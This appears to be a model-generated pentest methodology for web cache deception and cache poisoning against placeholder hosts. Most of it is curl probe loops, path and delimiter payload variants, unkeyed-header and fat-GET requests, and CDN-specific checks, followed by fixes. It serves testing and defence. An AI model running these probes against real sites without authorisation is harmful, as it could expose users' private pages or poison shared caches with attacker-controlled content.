# mimo-v2.6-flash — cache
# SOURCE: OAO gateway (mimo-v2.6-pro), prompt: mimo-2.6-agents.md, non-streaming

Web cache deception caches victim-specific response under attacker-chosen static-looking path. Cache poisoning injects attacker-controlled response variant into shared cache key. Core test: prove origin interpretation differs from CDN cache-key or cacheability decision.

## Test discipline

Use unique marker and disposable account. Send first request authenticated, second identical cache key without cookies. Confirm `Age` increases or cache header changes from miss to hit.

```bash
HOST='scope.example'
NONCE="$(openssl rand -hex 8)"
URL="https://$HOST/account.$NONCE.css"

curl --path-as-is -kisS "$URL" \
  -H 'Cookie: session=DISPOSABLE_SESSION' \
  -o victim.txt

sleep 2

curl --path-as-is -kisS "$URL" \
  -H 'Cache-Control: max-age=0' \
  -o anonymous.txt

grep -Ei '^(HTTP/|Age:|Cache-Control:|Vary:|CF-Cache-Status:|X-Cache:|X-Cache-Hits:|X-Cache-Key:)' \
  victim.txt anonymous.txt
diff -u victim.txt anonymous.txt
```

Do not use `Cache-Control: no-cache` during hit confirmation: some CDNs revalidate or bypass. Unique path isolates test.

## Web cache deception

### Path confusion: suffix

Vulnerable chain:

- CDN sees `.css`, marks response cacheable.
- Router/framework ignores suffix or treats `/account.css` as `/account`.
- Origin returns authenticated HTML.
- Cache key excludes cookie or session.

Request 1 — victim:

```http
GET /account.css HTTP/1.1
Host: scope.example
Cookie: session=DISPOSABLE_SESSION
Accept: text/html
Connection: close
```

Illustrative response:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=120
CF-Cache-Status: MISS

<html><body>Email: test-victim@example.invalid</body></html>
```

Request 2 — anonymous:

```http
GET /account.css HTTP/1.1
Host: scope.example
Connection: close
```

Vulnerable response:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Age: 7
CF-Cache-Status: HIT

<html><body>Email: test-victim@example.invalid</body></html>
```

Variants:

```text
/account.css
/account/anything.css
/account;.css
/account/.css
/account%2fanything.css
/account%3fanything.css
/account%23anything.css
/account%0d.css
/account%0a.css
/account%09.css
/account%00.css
/account..css
/account%2e css
/account.js/anything
```

Encoding behavior depends on normalization order. Test raw and encoded forms:

```bash
for p in \
  '/account.css' \
  '/account/anything.css' \
  '/account;.css' \
  '/account%0d.css' \
  '/account%0a.css' \
  '/account%09.css' \
  '/account%2fanything.css'
do
  printf '\n=== %s ===\n' "$p"
  curl --path-as-is -skD - -o /dev/null "https://scope.example$p" \
    -H 'Cookie: session=DISPOSABLE_SESSION'
done
```

`%0d` here tests path canonicalization disagreement. It is not literal HTTP header injection unless some layer decodes it before request-line parsing.

### Delimiter confusion

Origin may stop routing at `;`, encoded `?`, encoded `#`, newline, or NUL while cache keys retain full path.

```http
GET /account;.css HTTP/1.1
Host: scope.example
Cookie: session=DISPOSABLE_SESSION
```

Possible origin interpretation:

```text
route = /account
path parameter = .css
```

Possible CDN interpretation:

```text
cacheable extension = .css
cache key = https://scope.example/account;.css
```

## Unkeyed-header cache poisoning

Condition:

1. Header reaches origin.
2. Header changes response.
3. Header absent from cache key.
4. Result remains cacheable.

### `X-Forwarded-Host`

Prime:

```http
GET /assets/app.js?cb=8f12b6 HTTP/1.1
Host: scope.example
X-Forwarded-Host: canary.example.invalid
Connection: close
```

Vulnerable miss:

```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=300
X-Cache: MISS

window.apiBase="https://canary.example.invalid/api";
```

Confirm without header:

```http
GET /assets/app.js?cb=8f12b6 HTTP/1.1
Host: scope.example
Connection: close
```

Vulnerable hit:

```http
HTTP/1.1 200 OK
Content-Type: application/javascript
Age: 4
X-Cache: HIT

window.apiBase="https://canary.example.invalid/api";
```

Commands:

```bash
URL="https://scope.example/assets/app.js?cb=$(openssl rand -hex 8)"

curl -skD prime.h -o prime.body "$URL" \
  -H 'X-Forwarded-Host: canary.example.invalid'

curl -skD hit.h -o hit.body "$URL"

grep -Ei '^(Age|CF-Cache-Status|X-Cache|X-Cache-Hits|Via):' prime.h hit.h
cmp prime.body hit.body
```

Header set:

```bash
for h in \
  'X-Forwarded-Host: canary.example.invalid' \
  'X-Host: canary.example.invalid' \
  'X-Original-Host: canary.example.invalid' \
  'Forwarded: host=canary.example.invalid;proto=http' \
  'X-Forwarded-Scheme: http' \
  'X-Forwarded-Proto: http'
do
  nonce="$(openssl rand -hex 8)"
  echo "=== $h ==="
  curl -skD - -o /dev/null \
    "https://scope.example/assets/app.js?cb=$nonce" \
    -H "$h"
done
```

Use inert marker domain. Response deltas worth checking:

```text
absolute URLs
redirect Location
canonical link
Open Graph URL
script/config endpoints
password-reset links
CSP report-uri
JSON host fields
mixed-content redirects
```

### `X-Forwarded-Scheme`

Prime:

```http
GET /login?cb=4193 HTTP/1.1
Host: scope.example
X-Forwarded-Scheme: http
```

Possible poisoned response:

```http
HTTP/1.1 301 Moved Permanently
Location: https://scope.example/login?cb=4193
Cache-Control: public, max-age=300
X-Cache: MISS
```

More useful detection: origin emits scheme-dependent absolute content or redirect while CDN keys only viewer URL.

## Fat GET

Fat GET sends body with `GET`. Cache may key request line and selected headers while origin consumes body.

Prime:

```http
GET /api/theme?cb=19f3 HTTP/1.1
Host: scope.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

theme=canary-19f3&format=html
```

Possible response:

```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: public, max-age=120
X-Cache: MISS

<body class="canary-19f3">
```

Confirm:

```http
GET /api/theme?cb=19f3 HTTP/1.1
Host: scope.example
```

Vulnerable hit:

```http
HTTP/1.1 200 OK
Age: 3
X-Cache: HIT

<body class="canary-19f3">
```

Command:

```bash
URL="https://scope.example/api/theme?cb=$(openssl rand -hex 8)"

curl -skD prime.h -o prime.body \
  -X GET "$URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'theme=canary-fat-get&format=html'

curl -skD hit.h -o hit.body "$URL"
diff -u prime.body hit.body
```

JSON variant:

```bash
curl -skD - -o - \
  -X GET 'https://scope.example/api/render?cb=7a12' \
  -H 'Content-Type: application/json' \
  --data '{"template":"canary-fat-get"}'
```

## Parameter cloaking

Goal: cache and origin parse query differently.

### Duplicate parameter

```http
GET /page?lang=en&lang=canary HTTP/1.1
Host: scope.example
```

Potential disagreement:

```text
CDN key normalization: first lang=en
Origin parser: last lang=canary
```

Then request:

```http
GET /page?lang=en HTTP/1.1
Host: scope.example
```

If same cache key, poisoned body survives.

Test both orders:

```bash
BASE='https://scope.example/page'

curl -skD a.h -o a.body "$BASE?cb=31&lang=en&lang=canary"
curl -skD b.h -o b.body "$BASE?cb=31&lang=en"
curl -skD c.h -o c.body "$BASE?lang=canary&lang=en&cb=32"
curl -skD d.h -o d.body "$BASE?lang=en&cb=32"
```

### Delimiter disagreement

Some origin stacks treat `;` as query separator while cache treats it as parameter data, or reverse.

```http
GET /page?key=base;callback=canary HTTP/1.1
Host: scope.example
```

Variants:

```text
?page=1;lang=canary
?page=1%3blang=canary
?page=1%26lang=canary
?page=1%3flang=canary
?page=1&utm_content=x;lang=canary
```

### Excluded tracking parameter

Dangerous configuration: CDN excludes `utm_*` from key, origin uses it semantically.

Prime:

```http
GET /render?id=7&utm_content=canary HTTP/1.1
Host: scope.example
```

Confirm:

```http
GET /render?id=7&utm_content=benign HTTP/1.1
Host: scope.example
```

If both map to same key but origin output depends on `utm_content`, poisoning exists.

## CDN-specific checks

### Cloudflare

Default cache key includes scheme, host, path, and query string; custom Cache Rules or Workers can change eligibility and key construction. Two requests sharing a Worker cache key share cached response. [4][5][7]

Indicators:

```text
CF-Cache-Status: MISS
CF-Cache-Status: HIT
Age: N
```

Checks:

```bash
# Extension-based eligibility
curl --path-as-is -skD - -o /dev/null \
  'https://scope.example/account.css' \
  -H 'Cookie: session=DISPOSABLE_SESSION'

# Query ignored or normalized by custom rule
curl -skD - -o /tmp/a 'https://scope.example/app.js?x=1'
curl -skD - -o /tmp/b 'https://scope.example/app.js?x=2'

# Host/scheme consumed by Worker or origin
curl -skD - -o - 'https://scope.example/app.js?cb=unique' \
  -H 'X-Forwarded-Host: canary.example.invalid'
```

Review Cache Rules, Cache Response Rules, custom cache-key templates, “Cache Everything,” and Worker calls to `caches.default.put()` or `fetch()` with rewritten requests. Cloudflare exposes URI and query fields to Cache Rule matching. [6][8][9]

### CloudFront

CloudFront cache policies independently select headers, cookies, and query strings included in cache key. Origin-request policy can forward values not included in key, creating classic unkeyed-input risk when origin response varies on them. [2][3][11]

Indicators:

```text
X-Cache: Miss from cloudfront
X-Cache: Hit from cloudfront
Age: N
Via: ...cloudfront.net...
X-Amz-Cf-Pop: ...
X-Amz-Cf-Id: ...
```

High-value review:

```text
CachePolicyConfig.ParametersInCacheKeyAndForwardedToOrigin
OriginRequestPolicy
HeadersConfig
CookiesConfig
QueryStringsConfig
cache behavior path patterns
Lambda@Edge viewer/origin request rewrites
CloudFront Functions URI normalization
```

PoC:

```http
GET /config.js?cb=cf-19f2 HTTP/1.1
Host: scope.example
X-Forwarded-Host: canary.example.invalid
Cookie: experiment=canary
```

Then:

```http
GET /config.js?cb=cf-19f2 HTTP/1.1
Host: scope.example
```

A hit containing either marker proves forwarded-but-unkeyed variation.

### Fastly

Focus on custom VCL:

```text
vcl_hash: req.url, req.http.host, selected headers
vcl_recv: query cleanup and pass/cache decisions
vcl_fetch/vcl_backend_response: TTL, private, Set-Cookie handling
restart behavior
surrogate keys
```

Indicators:

```text
X-Cache: MISS
X-Cache: HIT
X-Cache-Hits: 0, 1
Age: N
Via: 1.1 varnish
```

Probe normalization:

```bash
for u in \
  '/page?a=1&b=2' \
  '/page?b=2&a=1' \
  '/page?a=1&a=2' \
  '/page?a=1%26b=2' \
  '/page?a=1;b=2'
do
  curl --path-as-is -skD - -o /dev/null "https://scope.example$u"
done
```

Custom VCL often creates risk by deleting query parameters before hashing while forwarding original or reconstructed parameters to backend.

### Akamai

Focus on Property Manager behavior:

```text
cache-key query-parameter inclusion/exclusion
Cache ID modification
path normalization
cacheability by extension
honor/no-store behavior
forwarded host/protocol headers
EdgeWorkers request and response transforms
```

Common indicators vary by property:

```text
X-Cache: TCP_MISS
X-Cache: TCP_HIT
X-Cache-Key: ...
X-Check-Cacheable: YES
Age: N
```

Diagnostic headers may be stripped publicly. Compare body, `Age`, stable edge identifiers, and timing instead of depending on one header.

## Success criteria

Report vulnerability only when all hold:

- Marker changes origin response.
- Marker input is absent from effective cache key.
- First response is stored.
- Header/body persists on request without marker.
- Persistence reproduces from separate unauthenticated client.
- Result contains sensitive data or attacker-controlled behavior.

## Fixes

- Never cache authenticated or personalized responses.
- Send `Cache-Control: private, no-store` for account routes.
- Reject ambiguous path encodings before routing.
- Make CDN and origin use same normalized path and query.
- Strip untrusted forwarding headers at edge; set trusted values explicitly.
- Include every response-varying input in cache key, or stop forwarding it.
- Reject GET bodies.
- Avoid extension-only cacheability rules.
- Purge tested keys after validation.

---

## [reasoning trace]


